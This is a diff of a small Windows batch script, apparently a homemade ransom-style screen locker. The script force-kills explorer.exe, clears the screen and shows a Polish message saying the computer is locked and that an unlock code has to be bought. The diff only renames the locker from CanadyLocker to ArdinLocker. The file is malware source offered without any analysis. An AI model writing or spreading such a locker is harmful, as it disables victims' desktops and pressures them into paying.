@@ -1,7 +1,7 @@
 @echo off
 taskkill /f /im explorer.exe
 cls
-echo twuj komputer zostal zablokowany przez CanadyLocker
+echo twuj komputer zostal zablokowany przez ArdinLocker
 echo rzeby go odblokowac musisz kupic kod odblokowujoncy
 set code=""
 
